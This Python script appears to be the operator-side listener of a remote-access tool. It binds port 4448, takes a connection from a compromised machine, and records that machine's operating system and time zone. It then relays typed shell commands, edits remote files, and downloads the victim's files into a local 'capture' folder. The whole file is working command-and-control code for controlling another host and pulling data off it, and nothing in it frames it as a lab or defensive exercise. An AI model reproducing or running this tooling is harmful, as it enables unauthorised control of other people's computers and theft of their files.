import socket
import os
import shutil

def info_receive_client(conn):
    receive_so = conn.recv(1024).decode()
    receive_zone = conn.recv(1024).decode()
    print(f"""
    ---------------------------------------------------------------------------
    + Information
    + [+] Operative System: {receive_so}
    + [+] Time Zone: {receive_zone}
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """)

def create_folder():
    path = 'capture'
    if not os.path.exists(path):
        os.makedirs(path)
        print("[+] Folder was created.")
    else:
        shutil.rmtree(path)
        print("[+] Directory successfully deleted.")
        os.makedirs(path)
        print("[+] Folder was created.")

def write_file(path, content):
    with open(path, "wb") as file:
       file.write(content)
    return "[+] Complete Download."

if __name__ == '__main__':
    try:
        # Enable socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        # IP - PORT
        server.bind(('0.0.0.0', 4448))
        print('[*] Providing connection.')
        # Listen server
        server.listen(1)
        print('[-] Waiting for connectivity...')
        conn, addr = server.accept()
        print(f'[+] Connected by: {addr}\n')

        info_receive_client(conn) # SO y TimeZone

        create_folder()
        while True:
            command = input(">> ").lower()
            conn.send(command.encode())
            if command == 'exit':
                server.close()
                break
            elif command.startswith('nano -a'):
                content = input(f'[*]{command[8:]} >>')
                while content != 'exit nano':
                    conn.send(content.encode())  # Enviar contenido como bytes
                    recv_msg = conn.recv(4096).decode()  # Recibir mensaje del cliente
                    print(recv_msg)  # Mostrar mensaje recibido del cliente
                    content = input(f'[*]{command[8:]} >>')
                conn.send(content.encode())
                recv_msg_exit = conn.recv(4096).decode()  # Recibir mensaje de salida del cliente
                print(recv_msg_exit)  # Mostrar mensaje de salida recibido del cliente
            elif command.startswith('nano -w'):
                content = input(f'[*]{command[8:]} >>')
                while content != 'exit nano':
                    conn.send(content.encode())
                    recv_msg = conn.recv(4096).decode()
                    content = input(f'[*]{command[8:]} >>')
                conn.send(content.encode())
                recv_msg_exit = conn.recv(4096).decode()
                print(recv_msg_exit)
            elif command.startswith("download"):
                file_path = command.split(" ")[1]
                file_content = conn.recv(9780639)
                msg_recv = write_file(file_path, file_content)
                print(msg_recv)             
            else:
                recv = conn.recv(6780639).decode()
                print(recv)
    except Exception as e:
        print("Error: ", e)
    except KeyboardInterrupt as k:
        print("KeyboardInterrupt: ",k)
    finally:
        server.close()
